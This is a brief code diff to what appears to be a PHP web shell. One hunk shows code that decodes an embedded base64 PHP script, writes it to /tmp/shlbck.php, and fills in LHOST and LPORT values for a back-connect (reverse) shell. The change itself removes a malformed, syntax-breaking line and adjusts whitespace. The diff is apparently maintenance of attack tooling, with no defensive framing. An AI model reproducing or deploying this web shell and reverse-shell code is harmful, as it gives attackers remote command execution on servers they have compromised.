@@ -150,7 +150,7 @@ if (version_compare($phpVersion, "5.0.0", "<")) {
 
     if (isset($_REQUEST["testGetMicrotime"])) {
         executeAndDisplay("getmicrotime");
-    }
+    } 
 
     if (isset($_REQUEST["testGetSystem"])) {
         executeAndDisplay("getsystem");
@@ -368,8 +368,6 @@ JGRhZW1vbikgewoJCXByaW50ICIkc3RyaW5nXG4iOwoJfQp9Cj8+IAoKCgo=";
         fputs($i = fopen("/tmp/shlbck.php", "w"), base64_decode($php));
         fclose($i);
         $buffer = "";
-        if $patterns = array("/LHOST/" => $ip,"/LPORT/" => $port);
-	
         $patterns = [
             "/LHOST/" => $ip,
             "/LPORT/" => $port,
